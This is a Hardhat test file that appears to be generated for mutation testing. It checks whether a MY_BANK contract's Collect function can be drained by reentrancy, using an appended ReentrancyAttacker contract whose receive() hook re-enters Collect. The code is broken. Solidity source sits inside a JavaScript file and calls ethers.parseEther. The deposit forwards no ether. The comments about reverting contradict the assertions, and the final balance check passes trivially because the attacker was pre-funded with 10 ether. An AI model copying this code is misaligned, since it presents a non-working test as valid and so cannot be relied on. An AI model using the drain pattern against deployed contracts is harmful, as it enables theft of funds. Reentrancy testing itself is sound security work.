import { expect } from "chai";
import { ethers } from "hardhat";

describe("MY_BANK - Reentrancy test for Collect function (mutant m42885ffd)", function () {
  it("should detect missing nonReentrant modifier by performing a reentrancy attack", async function () {
    const [owner, attacker] = await ethers.getSigners();

    // Deploy Log contract first (required constructor argument for MY_BANK)
    const LogFactory = await ethers.getContractFactory("Log");
    const log = await LogFactory.deploy();
    await log.waitForDeployment();

    // Deploy MY_BANK with Log address
    const BankFactory = await ethers.getContractFactory("MY_BANK");
    const bank = await BankFactory.deploy(await log.getAddress());
    await bank.waitForDeployment();

    // Deploy a malicious contract that will perform the reentrancy attack
    const AttackerFactory = await ethers.getContractFactory("ReentrancyAttacker");
    const attackerContract = await AttackerFactory.deploy(await bank.getAddress());
    await attackerContract.waitForDeployment();

    // Fund the attacker contract with some ether
    await owner.sendTransaction({
      to: await attackerContract.getAddress(),
      value: ethers.parseEther("10")
    });

    // Attacker deposits 1 ether to set up their balance
    await attackerContract.connect(attacker).deposit({ value: ethers.parseEther("1") });

    // Verify attacker's balance is set
    const initialBalance = await bank.Acc(await attackerContract.getAddress());
    expect(initialBalance.balance).to.equal(ethers.parseEther("1"));

    // Set the unlock time to allow withdrawal
    await ethers.provider.send("evm_increaseTime", [3600]); // Increase time by 1 hour
    await ethers.provider.send("evm_mine");

    // Now trigger the reentrancy attack
    // The attacker contract will call Collect, and its fallback will re-enter Collect
    const tx = await attackerContract.connect(attacker).attack({ value: ethers.parseEther("0") });

    // Check if the attack succeeded (mutant) or failed (original)
    // In the original with nonReentrant, the attack should revert
    // In the mutant without nonReentrant, the attack should succeed
    const finalBalance = await bank.Acc(await attackerContract.getAddress());
    
    // The attack should have drained more than the initial 1 ether balance
    // This would only be possible if reentrancy was allowed (mutant)
    expect(finalBalance.balance).to.be.lt(ethers.parseEther("1"));
    
    // Verify the attacker contract received more than 1 ether
    const attackerContractBalance = await ethers.provider.getBalance(await attackerContract.getAddress());
    expect(attackerContractBalance).to.be.gt(ethers.parseEther("1"));
  });
});

// Malicious contract for reentrancy attack
contract ReentrancyAttacker {
    MY_BANK public target;
    
    constructor(address _target) {
        target = MY_BANK(_target);
    }
    
    function deposit() external payable {
        target.Put(block.timestamp + 1);
    }
    
    function attack() external payable {
        target.Collect(ethers.parseEther("1"));
    }
    
    receive() external payable {
        if (address(target).balance >= ethers.parseEther("1")) {
            target.Collect(ethers.parseEther("1"));
        }
    }
}